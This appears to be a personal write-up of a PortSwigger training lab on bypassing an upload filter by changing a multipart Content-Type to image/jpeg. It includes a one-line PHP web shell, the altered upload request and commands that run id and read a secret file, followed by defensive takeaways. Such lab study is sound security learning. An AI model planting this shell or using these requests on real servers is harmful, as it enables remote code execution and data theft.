# Lab 02 — Web shell upload via Content-Type restriction bypass

**Difficulty:** 🟢 Apprentice  
**Technique:** File Upload — Content-Type bypass  
**Link:** https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass

---

## Concept

The application validates the `Content-Type` header of the uploaded file rather than the actual file extension or contents. By intercepting the upload request and changing the Content-Type to an allowed MIME type (`image/jpeg`), the validation is bypassed while the `.php` extension is preserved — allowing the server to execute it.

---

## Process

### Step 1 — Prepare the web shell

```php
<?php echo system($_GET['command']); ?>
```

Save as `shell.php`.

### Step 2 — Intercept the upload request in Burp

Upload `shell.php` through the avatar feature and intercept the POST request in Burp Proxy.

### Step 3 — Modify the Content-Type in the multipart body

Change:
```
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: application/x-php
```

To:
```
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg
```

Forward the request — the server accepts it and stores `shell.php`.

### Step 4 — Verify RCE

```
GET /files/avatars/shell.php?command=id HTTP/2
```

### Step 5 — Exfiltrate the secret

```
GET /files/avatars/shell.php?command=cat+/home/carlos/secret HTTP/2
```

---

## Issues encountered

Initially modified the Content-Type on the wrong request — the response instead of the upload POST. The header that matters is inside the `multipart/form-data` body of the POST request, not the HTTP response.

---

## Takeaways

- The Content-Type inside the multipart body is separate from the main HTTP Content-Type header
- Validating only the declared Content-Type is not sufficient — it can be freely modified by the client
- The correct fix is to validate the actual file contents (magic bytes) and extension, server-side
- Always intercept the upload POST, not the image GET

---

## References

- [File Upload Vulnerabilities — PortSwigger](https://portswigger.net/web-security/file-upload)
